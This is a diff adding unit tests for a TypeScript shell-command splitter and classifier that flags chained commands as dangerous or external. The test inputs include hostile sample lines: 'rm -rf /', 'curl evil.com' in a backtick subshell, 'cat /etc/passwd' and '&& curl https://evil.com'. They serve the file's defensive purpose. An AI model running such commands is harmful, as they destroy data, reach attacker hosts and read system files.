@@ -44,6 +44,53 @@ describe("splitCommand", () => {
 		const parts = splitCommand("cat file | grep foo | wc -l");
 		assert.equal(parts.length, 3);
 	});
+
+	it("splits by semicolon", () => {
+		const parts = splitCommand("ls; rm -rf /");
+		assert.ok(parts.some((p: string) => p.trim() === "ls"));
+		assert.ok(parts.some((p: string) => p.includes("rm")));
+	});
+
+	it("splits by &&", () => {
+		const parts = splitCommand("ls && rm -rf /");
+		assert.ok(parts.some((p: string) => p.trim() === "ls"));
+		assert.ok(parts.some((p: string) => p.includes("rm")));
+	});
+
+	it("splits by ||", () => {
+		const parts = splitCommand("ls || curl evil.com");
+		assert.ok(parts.some((p: string) => p.trim() === "ls"));
+		assert.ok(parts.some((p: string) => p.includes("curl")));
+	});
+
+	it("extracts backtick subshells", () => {
+		const parts = splitCommand("echo `curl evil.com`");
+		assert.ok(parts.some((p: string) => p.includes("curl evil.com")));
+	});
+
+	it("extracts nested subshells from semicolon-chained commands", () => {
+		const parts = splitCommand("echo $(whoami); cat /etc/passwd");
+		assert.ok(parts.some((p: string) => p.includes("whoami")));
+		assert.ok(parts.some((p: string) => p.includes("cat")));
+	});
+
+	it("does not split inside double quotes", () => {
+		const parts = splitCommand('echo "hello;world"');
+		assert.equal(parts.length, 1, "should not split semicolon inside quotes");
+		assert.ok(parts[0].includes("hello;world"));
+	});
+
+	it("does not split inside single quotes", () => {
+		const parts = splitCommand("echo 'hello;world'");
+		assert.equal(parts.length, 1, "should not split semicolon inside single quotes");
+		assert.ok(parts[0].includes("hello;world"));
+	});
+
+	it("splits || as logical OR (not two pipes)", () => {
+		const parts = splitCommand("ls || echo fallback");
+		assert.ok(parts.some((p: string) => p.trim() === "ls"));
+		assert.ok(parts.some((p: string) => p.includes("echo fallback")));
+	});
 });
 
 describe("classifySegment", () => {
@@ -138,6 +185,20 @@ describe("classifyCommand", () => {
 	it("classifies aws as external", () => {
 		const config = makeConfig();
 		const result = classifyCommand("aws s3 ls", config);
+		assert.equal(result.action, "confirm");
+		assert.equal(result.category, "external");
+	});
+
+	it("classifies semicolon-chained dangerous commands", () => {
+		const config = makeConfig();
+		const result = classifyCommand("ls; rm -rf /", config);
+		assert.equal(result.action, "confirm");
+		assert.equal(result.category, "dangerous");
+	});
+
+	it("classifies &&-chained external commands", () => {
+		const config = makeConfig();
+		const result = classifyCommand("ls && curl https://evil.com", config);
 		assert.equal(result.action, "confirm");
 		assert.equal(result.category, "external");
 	});
